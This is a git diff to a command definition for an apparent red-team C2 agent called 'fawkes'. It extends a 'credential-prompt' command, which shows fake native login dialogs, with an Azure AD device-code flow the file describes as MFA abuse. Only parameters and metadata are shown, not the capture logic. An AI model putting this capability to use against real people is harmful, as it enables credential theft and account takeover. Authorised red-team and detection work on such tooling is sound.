@@ -12,21 +12,36 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "credential-prompt",
-		Description:         "Display a native credential dialog to capture user credentials. macOS: AppleScript dialog. Windows: CredUI prompt. Linux: zenity/kdialog/yad.",
-		HelpString:          "credential-prompt [-title \"Authentication Required\"] [-message \"Enter your credentials...\"] [-icon caution]",
-		Version:             2,
+		Description:         "Display a native credential dialog or initiate OAuth device code flow for MFA abuse. macOS: AppleScript. Windows: CredUI. Linux: zenity. Cross-platform: device-code flow.",
+		HelpString:          "credential-prompt [-action dialog|device-code] [-title \"Authentication Required\"] [-message \"Enter your credentials...\"] [-icon caution] [-tenant_id <id>] [-client_id <id>]",
+		Version:             3,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
 		AssociatedBrowserScript: &agentstructs.BrowserScript{
 			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "credential_prompt_new.js"),
 			Author:     "@galoryber",
 		},
-		MitreAttackMappings: []string{"T1056.002"}, // Input Capture: GUI Input Capture
+		MitreAttackMappings: []string{"T1056.002", "T1621", "T1111"}, // Input Capture, MFA Request Generation, MFA Interception
 		ScriptOnlyCommand:   false,
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{agentstructs.SUPPORTED_OS_MACOS, agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX},
 		},
 		CommandParameters: []agentstructs.CommandParameter{
+			{
+				Name:             "action",
+				ModalDisplayName: "Action",
+				CLIName:          "action",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
+				Choices:          []string{"dialog", "device-code"},
+				Description:      "Action: dialog (native credential prompt) or device-code (OAuth MFA abuse via Azure AD device code flow)",
+				DefaultValue:     "dialog",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+					},
+				},
+			},
 			{
 				Name:             "title",
 				ModalDisplayName: "Dialog Title",
@@ -63,6 +78,34 @@ func init() {
 				Choices:          []string{"caution", "note", "stop"},
 				Description:      "Dialog icon: caution (warning triangle), note (info), or stop (critical)",
 				DefaultValue:     "caution",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+					},
+				},
+			},
+			{
+				Name:             "tenant_id",
+				ModalDisplayName: "Azure Tenant ID",
+				CLIName:          "tenant_id",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "Azure AD tenant ID for device-code flow (default: organizations for multi-tenant)",
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+					},
+				},
+			},
+			{
+				Name:             "client_id",
+				ModalDisplayName: "OAuth Client ID",
+				CLIName:          "client_id",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "OAuth client ID for device-code flow (default: Microsoft Office first-party app)",
+				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: false,
